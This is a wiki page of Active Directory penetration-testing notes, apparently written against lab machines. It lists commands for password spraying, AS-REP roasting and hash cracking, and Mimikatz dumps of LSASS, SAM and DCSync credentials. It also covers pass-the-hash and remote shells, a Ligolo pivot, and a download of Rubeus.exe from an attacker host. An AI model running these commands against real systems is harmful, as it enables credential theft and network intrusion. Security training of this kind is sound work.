---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internals
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Useful Resources
  - **[Wadcoms - Interactive Cheat Sheet for Active Directory](https://wadcoms.github.io/)**
  - **[Active Directory Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)**

-----------------------------------------------------------------------

# Initial Access

## Password Spraying
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**Additional Resources**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)
  - [Hashcat Wordlists - InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)

## Rid Brute via SMB
**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/[DOMAIN]\\//' > users.txt
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

## LDAP Enumeration
**[LDAPSearch Enumeration](https://notes.benheater.com/books/active-directory/page/ldapsearch)**

```
ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
```

**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**
  - Old tool however useful if Bloodhound.py isn't working as intended.

**Additional resources**
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

## SMB Enumeration
**[SMB - Share Enumeration](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
```
nxc smb [IP] --shares
```

**Additional Resources**
  - [BIWasp/NetExec cheat sheet](https://github.com/BlWasp/NetExec-Cheatsheet)
  - [SMB Enumeration cheat sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [CrackMapExec + NetExec cheat sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

## Web Application Vulnerabilities
**[Bad PDF](https://github.com/deepzec/Bad-Pdf)**

**Additional Resources**
  - [Malicious PDF](https://github.com/jonaslejon/malicious-pdf)

## Integrated DNS Dump
[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

-----------------------------------------------------------------------

# Domain Enumeration

## Impacket (via Python)
**[Enumeration via Impacket](https://github.com/fortra/impacket)**
  - GetADUsers.py

## Bloodhound
**[BloodHound CE](https://github.com/SpecterOps/BloodHound)**

```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

**Additional Resources** 
  - [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
  - [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

**[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)**

**Additional Resources**
  - [BloodHound.py for Bloodhound CE version](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce)

```
python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
proxychains bloodhound-python -u "web_svc"  -d 'painters.htb' -dc 'dc.painters.htb' --dns-tcp -c ALL -v -ns 192.168.110.55 [proxychains equivalent]
```

-----------------------------------------------------------------------

# Poisoning and Relay
## Responder
**[Responder](https://github.com/lgandx/Responder)**
  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

```
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
/opt/tools/Responder/ (location of Responder)
```

## SMB Relay 
**[SMB Relay]**
```
nxc smb [IP] --gen-relay-list relay.txt
```

-----------------------------------------------------------------------

# Local Privilege Escalation

**Resources**
  - [Privilege Escalation Useful Tools](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#useful-tools)
  - [Exploitable Vulnerabilities](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)
-----------------------------------------------------------------------

# Lateral Movement

## Smbexec
**[Smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)**

## WinRM 
**[Evil-WinRM - ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)**

```
gem install evil-winrm
evil-winrm -i <IP> -u <username> -p <password>
evil-winrm -i <IP> -u <username> -H <ntlm hash>
evil-winrm -i <IP> -u <username> -k

## Run Powershell Commands
whoami
ipconfig
Get-Process

## Upload and Download Files
upload /local/path/to/file /remote/path
download /remote/path/to/file /local/path

## Run Powershell Scripts
upload /local/path/to/script.ps1 /remote/path/script.ps1
powershell -File /remote/path/script.ps1
```

## Mimikatz
**[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**

```
#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

**Additional Resources**
  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
  - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)

## Network Pivoting via Ligolo-ng
**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**

```
./agent -connect 10.10.14.5:443 -ignore-cert
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
session
start
sudo ip route add 192.168.110.0/24 dev ligolo

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)

powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
```

**Additional Resources**
  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)

-----------------------------------------------------------------------

# Exfiltration (Domain Controller)

## Extraction of ntds.dit
**[ntdsutil](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#a-d-maintenance-ntdsutil)**
**[VSSAdmin](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds#volume-shadow-copy-vssadmin)**

## Exploitation of Monitoring Systems
**[Exploitation of Monitoring Systems](https://github.com/HD421/Monitoring-Systems-Cheat-Sheet)**

  - [Zabbix Agent](https://medium.com/@ferspider3/enabling-zabbix-agent-windows-to-accept-remote-commands-2597c40259b6)
    - Scripts in Zabbix can be used to perform custom monitoring checks, collect and process data from external sources, and automate tasks based on monitoring events.
  - [Zabbix SSO bypass](https://github.com/Mr-xn/cve-2022-23131)

-----------------------------------------------------------------------

# Active Directory Tools
**[NetExec](https://github.com/Pennyw0rth/NetExec)**
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
source $HOME/.cargo/env
pipx install git+https://github.com/Pennyw0rth/NetExec
```

**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
```
. .\powerview.ps1
Import-Module C:\Temp\PowerView.ps1
```

**NSE**
```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```

**SMB**
Enum4Linux
SMBMap
smbclient
smbclient.py (Impacket)
**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**

**[Impacket]()**
```
python3 -m pipx install impacket
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)

smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
psexec.py -k -no-pass Administrator@dc.painters.htb -dc-ip 192.168.110.55 -debug (sometimes don't need the domain)
smbexec.py administrator@dc.painters.htb -k -no-pass -debug
  - [smbexec](https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec)
```

**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**

**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**

**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**


## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
 - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/)
